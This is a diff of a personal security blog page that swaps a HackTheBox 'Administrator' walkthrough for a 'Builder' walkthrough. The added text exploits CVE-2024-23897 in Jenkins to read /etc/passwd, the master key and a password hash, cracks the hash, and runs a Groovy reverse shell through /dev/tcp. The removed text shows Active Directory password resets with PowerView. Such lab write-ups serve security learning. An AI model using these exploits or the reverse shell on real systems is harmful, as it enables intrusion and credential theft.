@@ -30,28 +30,28 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.4.1" />
-<meta property="og:title" content="HackTheBox - Administrator" />
+<meta property="og:title" content="HackTheBox - Builder" />
 <meta name="author" content="S4nity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash." />
-<meta property="og:description" content="Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash." />
-<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Administrator/" />
-<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Administrator/" />
+<meta name="description" content="Builder is a medium difficulty Linux machine, that requires us to exploit CVE-2024-23897 to gain a foothold. After gaining a foothold we are able to extract credentials for Jenkis, which allows us to grab a SSH key for the root user." />
+<meta property="og:description" content="Builder is a medium difficulty Linux machine, that requires us to exploit CVE-2024-23897 to gain a foothold. After gaining a foothold we are able to extract credentials for Jenkis, which allows us to grab a SSH key for the root user." />
+<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Builder/" />
+<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Builder/" />
 <meta property="og:site_name" content="Sanity-Archive" />
-<meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" />
+<meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-10-11T13:00:00+02:00" />
+<meta property="article:published_time" content="2025-10-13T13:00:00+02:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" />
-<meta property="twitter:title" content="HackTheBox - Administrator" />
+<meta property="twitter:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png" />
+<meta property="twitter:title" content="HackTheBox - Builder" />
 <meta name="twitter:site" content="@" />
 <meta name="twitter:creator" content="@S4nity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-10-12T13:16:45+02:00","datePublished":"2025-10-11T13:00:00+02:00","description":"Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash.","headline":"HackTheBox - Administrator","image":"https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Administrator/"},"url":"http://localhost:4000/posts/HackTheBox-Administrator/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"S4nity","url":"https://sanity-archive.github.io/"},"dateModified":"2025-10-13T13:00:00+02:00","datePublished":"2025-10-13T13:00:00+02:00","description":"Builder is a medium difficulty Linux machine, that requires us to exploit CVE-2024-23897 to gain a foothold. After gaining a foothold we are able to extract credentials for Jenkis, which allows us to grab a SSH key for the root user.","headline":"HackTheBox - Builder","image":"https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Builder/"},"url":"http://localhost:4000/posts/HackTheBox-Builder/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>HackTheBox - Administrator | Sanity-Archive
+  <title>HackTheBox - Builder | Sanity-Archive
   </title>
 
   <!--
@@ -445,7 +445,7 @@
         
           
             
-              <span>HackTheBox - Administrator</span>
+              <span>HackTheBox - Builder</span>
             
 
           
@@ -733,6 +733,69 @@
     <!-- combine -->
     
   
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
 
   
 
@@ -758,6 +821,28 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
       
 
       
@@ -826,9 +911,9 @@
 
 <article class="px-1" data-toc="true">
   <header>
-    <h1 data-toc-skip>HackTheBox - Administrator</h1>
+    <h1 data-toc-skip>HackTheBox - Builder</h1>
     
-      <p class="post-desc fw-light mb-4">Administrator is a medium difficulty Windows machine that requires us to jump between multiple user accounts. After gaining access to a certain user account, we can execute a DC-sync attack to receive the administrator password hash.</p>
+      <p class="post-desc fw-light mb-4">Builder is a medium difficulty Linux machine, that requires us to exploit CVE-2024-23897 to gain a foothold. After gaining a foothold we are able to extract credentials for Jenkis, which allows us to grab a SSH key for the root user.</p>
     
 
     <div class="post-meta text-muted">
@@ -845,41 +930,18 @@
 
 <time
   
-  data-ts="1760180400"
+  data-ts="1760353200"
   data-df="ll"
   
     data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  Oct 11, 2025
+  Oct 13, 2025
 </time>
 
       </span>
 
       <!-- lastmod date -->
-      
-        <span>
-          Updated
-          <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1760267805"
-  data-df="ll"
-  
-    data-bs-toggle="tooltip" data-bs-placement="bottom"
-  
->
-  Oct 12, 2025
-</time>
-
-        </span>
       
 
       
@@ -890,7 +952,7 @@
         
 
         <div class="mt-3 mb-3">
-          <a href="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png" class="popup img-link preview-img shimmer"><img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9d232b1558b7543c7cb85f2774687363.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+          <a href="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png" class="popup img-link preview-img shimmer"><img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
       
 
       <div class="d-flex justify-content-between">
@@ -935,9 +997,9 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1239 words"
+  title="751 words"
 >
-  <em>6 min</em> read</span>
+  <em>4 min</em> read</span>
 
         </div>
       </div>
@@ -946,7 +1008,7 @@
 
   
     <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
-      <span class="label text-truncate">HackTheBox - Administrator</span>
+      <span class="label text-truncate">HackTheBox - Builder</span>
       <button type="button" class="toc-trigger btn me-1">
         <i class="fa-solid fa-list-ul fa-fw"></i>
       </button>
@@ -959,7 +1021,7 @@
 
     <dialog id="toc-popup" class="p-0">
       <div class="header d-flex flex-row align-items-center justify-content-between">
-        <div class="label text-truncate py-2 ms-4">HackTheBox - Administrator</div>
+        <div class="label text-truncate py-2 ms-4">HackTheBox - Builder</div>
         <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
           <i class="fas fa-close"></i>
         </button>
@@ -970,144 +1032,8 @@
 
   <div class="content">
     <h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
 <p>First we do a nmap scan to see which services are running on the system:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap.txt 10.129.95.15
-
-21/tcp   open  ftp           Microsoft ftpd
-53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2025-10-09 19:35:35Z<span class="o">)</span>
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-3269/tcp open  tcpwrapped
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>We can see that FTP (Port 21), DNS (Port 53), Kerberos(Port 88) LDAP (Port 389), SMB (Port 445/139), and WinRM (Port 5985) are open.
-It appears to be a DC.
-<br />
-Next we test if we are able to connect to FTP, with either Anonymous or the credentials we received on starting the machine (Olivia:ichliebedich).
-Unfortunately neither of them work.
-<br />
-Afterwards we use NetExec to enumerate the SMB shares:</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-</pre></td><td class="rouge-code"><pre>nxc smb 10.129.95.15 <span class="nt">-u</span> Olivia <span class="nt">-p</span> <span class="s1">'ichliebedich'</span> <span class="nt">--shares</span>
-SMB         10.129.95.15    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
-SMB         10.129.95.15    445    DC               <span class="o">[</span>+] administrator.htb<span class="se">\O</span>livia:ichliebedich 
-SMB         10.129.95.15    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerated shares
-SMB         10.129.95.15    445    DC               Share           Permissions     Remark
-SMB         10.129.95.15    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
-SMB         10.129.95.15    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
-SMB         10.129.95.15    445    DC               C<span class="nv">$ </span>                             Default share
-SMB         10.129.95.15    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
-SMB         10.129.95.15    445    DC               NETLOGON        READ            Logon server share 
-SMB         10.129.95.15    445    DC               SYSVOL          READ            Logon server share
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>It doesn’t appear to be bountiful at first glance, which is why we move on to gather more information from inside the system.</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-</pre></td><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Olivia <span class="nt">-p</span> <span class="s1">'ichliebedich'</span>
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt;
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Next we use SharpHound (Version 1.1.1), which we can get from GitHub. We can up-&amp;download files from and to the directory we are in via Evil-WinRM.</p>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; upload SharpHound.zip
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; Expand-Archive .<span class="se">\S</span>harpHound.zip
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>SharpHound
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; download .<span class="se">\2</span>0251009184223_BloodHound.zip
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>Then we import the Zip-file to Bloodhound.<br />
-If we search for Olivia we can see, that she has an outbound object control of “GenericAll” over Michael, who has “ForceChangePassword” control over Benjamin.</p>
-
-<p><a href="/post-images/administrator/bloodhound_initial.jpg" class="popup img-link  shimmer"><img src="/post-images/administrator/bloodhound_initial.jpg" alt="Bloodhound initial screenshot" loading="lazy"></a></p>
-
-<p>Next we navigate to C:\programdata and create a share directory, so that we can access files with other user accounts as well and upload powerview.ps1 into it.</p>
-<blockquote class="prompt-info">
-  <p>powerview.ps1 comes pre-installed with Kali, to find it use: “locate powerview”, else download it from GitHub.</p>
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-3
-4
-5
-6
-7
-</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\o</span>livia<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">mkdir </span>share
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata&gt; <span class="nb">cd </span>share
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; upload powerview.ps1
-</pre></td></tr></tbody></table></code></div></div>
-
-<p>We can use our GenericAll control over Michael to force change their password via PowerView.</p>
-
-<blockquote class="prompt-danger">
-  <p>We should never use bad passwords like this in a real world environment!</p>
-</blockquote>
-
-<p>First we create a secure string for the new password, followed by a secure string of our current users credentials, which then allows us to run the exploit and log in with the credentials of Michael:Password123!.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1123,27 +1049,42 @@ If we search for Olivia we can see, that she has an outbound object control of �
 10
 11
 12
-13
-</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$UserPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'Password123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'ichliebedich'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'administrator.htb\olivia'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Set-DomainUserPassword <span class="nt">-Identity</span> Michael <span class="nt">-AccountPassword</span> <span class="nv">$UserPassword</span> <span class="nt">-Credential</span> <span class="nv">$Cred</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nb">exit</span>
-&lt;...&gt;
-evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Michael <span class="nt">-p</span> <span class="s1">'Password123!'</span>
+</pre></td><td class="rouge-code"><pre>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  http    Jetty 10.0.18
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty<span class="o">(</span>10.0.18<span class="o">)</span>
+|_http-title: Dashboard <span class="o">[</span>Jenkins]
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Michael has ForceChangePassword control over Benjamin, which allows us to repeat the exploit from above again.</p>
+<p>We can see that it is pretty much just SSH and Jenkins.<br /><br /></p>
 
-<blockquote class="prompt-danger">
-  <p>Don’t use the same password twice in a real world environment!</p>
-</blockquote>
+<h2 id="gaining-a-foothold"><span class="me-2">Gaining a foothold</span><a href="#gaining-a-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>Entering the Jenkins page directs us to the dashboard. In the bottom right corner we can see, that it is Jenkins version 2.441.
+A quick search reveals, that it is vulnerable to CVE-2024-23897. I continued to enumerate the dashboard and found on the “People”-page two entries:</p>
+
+<p><a href="/post-images/builder/jenkins_users.jpg" class="popup img-link  shimmer"><img src="/post-images/builder/jenkins_users.jpg" alt="Jenkins people directory" loading="lazy"></a></p>
+
+<p>The CVE appears to be a local file inclusion.
+I tried the Metasploit Auxiliary Module for this CVE and tried POCs, but with no luck, so I switched to executing the attack manually.<br />
+HackTheBox has a <a href="https://www.hackthebox.com/blog/cve-2024-23897">great guide</a> for this CVE!<br /><br /></p>
+
+<p>So first we need to curl the jenkins-cli.jar file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>curl http://10.129.202.31:8080/jnlpJars/jenkins-cli.jar <span class="nt">--output</span> jenkins-cli.jar
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The LFI works by adding an “@” in front of the path, when you run the “connect-node” command.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1154,25 +1095,38 @@ evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> Mi
 5
 6
 7
-8
-9
-10
-11
-</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>ichael<span class="se">\D</span>ocuments&gt; <span class="nb">cd </span>C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare
+</pre></td><td class="rouge-code"><pre>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> http://10.129.202.31:8080/ connect-node <span class="s2">"@/etc/passwd"</span>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin:
 &lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Import-Module .<span class="se">\p</span>owerview.ps1
+root:x:0:0:root:/root:/bin/bash:
 &lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'Password123!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+jenkins:x:1000:1000::/var/jenkins_home:/bin/bash:
 &lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'administrator.htb\michael'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\p</span>rogramdata<span class="se">\s</span>hare&gt; Set-DomainUserPassword <span class="nt">-Identity</span> Benjamin <span class="nt">-AccountPassword</span> <span class="nv">$SecPassword</span> <span class="nt">-Credential</span> <span class="nv">$Cred</span>
-&lt;...&gt;
-<span class="nb">exit</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>BloodHound didn’t show us any outbound control for Benjamin, which is why we need to check if our new accounts have access to other protocols.<br />
-Benjamin seems to have access to FTP, which contains a psafe3 file.</p>
+<p>Afterwards I wanted to gather more information about Jenkins itself. So I decided to get the master.key from the secrets directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> http://10.129.202.31:8080/ connect-node <span class="s2">"@/var/jenkins_home/secrets/master.key"</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Then I tried to get other “high value” files and SSH keys, but with no luck.
+So I started enumerating the Jenkins users:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> http://10.129.202.31:8080/ connect-node <span class="s2">"@/var/jenkins_home/users/users.xml"</span>
+&lt;...&gt;
+&lt;string&gt;jennifer_12108429903186576833&lt;/string&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Remember how we saw Jennifer in the “People”-page earlier? Let’s dive deeper!<br />
+The string jennifer_12108429903186576833 is actually a directory, which stores the config.xml file of the user.</p>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
@@ -1180,151 +1134,78 @@ Benjamin seems to have access to FTP, which contains a psafe3 file.</p>
 2
 3
 4
-5
-6
-7
-8
-9
-</pre></td><td class="rouge-code"><pre>ftp benjamin@10.129.95.15
+</pre></td><td class="rouge-code"><pre>java <span class="nt">-jar</span> jenkins-cli.jar <span class="nt">-s</span> http://10.129.202.31:8080/ connect-node <span class="s2">"@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"</span>
 &lt;...&gt;
-Password:
+&lt;passwordHash&gt;#jbcrypt:<span class="k">***</span>&lt;/passwordHash&gt;
 &lt;...&gt;
-ftp&gt; <span class="nb">ls</span>
-&lt;...&gt;
-ftp&gt; get Backup.psafe3
-&lt;...&gt;
-ftp&gt; <span class="nb">exit</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>A quick research reveals, that it is a password safe file, which can be cracked with JohnTheRipper.
-First we need to extract the hash via pwsafe2john and then crack it with john.</p>
+<p>Now we can try to crack the hash with HashCat.</p>
 
 <blockquote class="prompt-info">
-  <p>If you want to display the password again, after cracking it, you can use “john backup_hash −−show”.</p>
+  <p>We need to use two flags to make it work. First we need the –user flag, so that “#jbcrypt:” is considered a username. Then we need -m 3200, because multiple encryptions match the structure of the hash.</p>
 </blockquote>
 
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-3
-4
-</pre></td><td class="rouge-code"><pre>pwsafe2john Backup.psafe3 <span class="o">&gt;</span> backup_hash
-&lt;...&gt;
-john backup_hash <span class="nt">--wordlist</span><span class="o">==</span>/usr/share/wordlists/rockyou.txt
-&lt;...&gt;
+</pre></td><td class="rouge-code"><pre>hashcat jen_hash /usr/share/wordlists/rockyou.txt <span class="nt">--user</span> <span class="nt">-m</span> 3200
+<span class="nv">$2a$10$*</span><span class="k">***</span>:p<span class="k">****</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Now we can open the file via the Password Safe software and use the password to unlock the vault.</p>
-<blockquote class="prompt-info">
-  <p>Double-click on an entry to copy their password.</p>
-</blockquote>
+<p>Then I tried to use the credentials for SSH, but it didn’t work.<br /><br /></p>
 
-<p><a href="/post-images/administrator/vault_unlocked.png" class="popup img-link  shimmer"><img src="/post-images/administrator/vault_unlocked.png" alt="Password vault unlocked" loading="lazy"></a></p>
-
-<p>A quick user search in BloodHound reveals, that neither Alexander, nor Emma have any Outbound Object Control.
-Emily on the other hand has GenericWrite control over Ethan, who has GetChangesAll control over the domain, which would allow us to execute a DC-Sync attack.
-<br />
-Lets grab the user flag first:</p>
+<p>So I went back to the website and tried to login with Jennifer:p*****.
+I got in, which allowed me to run a Groovy script to get a reverse shell running.<br />
+First, navigate to “Manage Jenkins” -&gt; “Script Console”.<br />
+Then open a listener and run this script:</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-4
-</pre></td><td class="rouge-code"><pre>evil-winrm <span class="nt">-i</span> 10.129.95.15 <span class="nt">-u</span> emily <span class="nt">-p</span> <span class="s1">'***'</span>
-&lt;...&gt;
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>mily<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-&lt;...&gt;
+</pre></td><td class="rouge-code"><pre>r <span class="o">=</span> Runtime.getRuntime<span class="o">()</span>
+p <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">"/bin/bash"</span>,<span class="s2">"-c"</span>,<span class="s2">"exec 5&lt;&gt;/dev/tcp/10.10.10.10/8844;cat &lt;&amp;5 | while read line; do </span><span class="se">\$</span><span class="s2">line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> as String[]<span class="o">)</span>
+p.waitFor<span class="o">()</span>
 </pre></td></tr></tbody></table></code></div></div>
 
